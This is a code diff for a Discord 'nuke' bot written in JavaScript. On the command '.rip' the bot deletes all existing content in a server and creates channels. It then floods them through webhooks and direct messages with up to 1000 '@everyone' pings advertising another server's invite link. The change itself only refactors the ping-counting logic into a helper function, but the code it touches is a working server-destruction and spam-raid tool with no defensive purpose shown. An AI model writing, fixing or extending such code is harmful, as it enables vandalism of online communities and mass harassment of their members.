@@ -33,12 +33,25 @@ client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
 
+let pingCount = 0;
+const maxPings = 1000;
+
+function addPing(count = 1) {
+  pingCount += count;
+  if (pingCount >= maxPings) {
+    pingCount = maxPings;
+    return true;
+  }
+  return false;
+}
+
 client.on('messageCreate', async (message) => {
   if (message.content === '.rip' && !message.author.bot) {
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
-    let pingCount = 0;
-    const maxPings = 1000;
+
+    // Reset ping count for each run
+    pingCount = 0;
 
     // Delete all existing content
     await Promise.all([
@@ -84,7 +97,7 @@ client.on('messageCreate', async (message) => {
     const spamTasks = [];
 
     for (const channel of createdChannels) {
-      if (pingCount >= maxPings) break;
+      if (addPing()) break;
 
       spamTasks.push(
         (async () => {
@@ -97,24 +110,22 @@ client.on('messageCreate', async (message) => {
           } catch {
             // Fallback to sending directly
             for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-              if (pingCount >= maxPings) break;
+              if (addPing()) break;
               spamTasks.push(channel.send(spamMessage).catch(() => {}));
-              pingCount++;
             }
             return;
           }
 
           for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-            if (pingCount >= maxPings) break;
+            if (addPing()) break;
             spamTasks.push(
               webhook.send(spamMessage).catch(async () => {
                 try {
                   await channel.send(spamMessage);
-                  pingCount++;
+                  addPing();
                 } catch {}
               })
             );
-            pingCount++;
           }
         })()
       );
